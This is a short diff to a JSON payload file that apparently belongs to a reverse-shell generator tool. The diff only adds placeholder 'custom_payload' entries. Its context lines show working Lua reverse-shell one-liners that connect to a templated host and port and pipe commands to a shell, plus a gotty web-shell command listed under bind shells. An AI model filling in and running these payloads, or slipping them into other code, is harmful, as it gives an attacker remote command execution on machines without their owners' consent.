@@ -152,6 +152,9 @@
     "lua": {
       "lua5.1": "lua5.1 -e 'local host, port = \"{host}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
       "lua-linux": "{binary_name} -e \"require('socket');require('os');t=socket.tcp();t:connect('{host}','{port}');os.execute('{shell_path} -i <&3 >&3 2>&3');\""
+    },
+    "custom_payload_type": {
+      "custom_payload_name": "custom_payload_value"
     }
   },
   "bind": {
@@ -181,6 +184,9 @@
     },
     "golang": {
       "gotty-webshell": "gotty {gotty_args}-w --reconnect {shell_path}"
+    },
+    "custom_payload_type": {
+      "custom_payload_name": "custom_payload_value"
     }
   }
 }
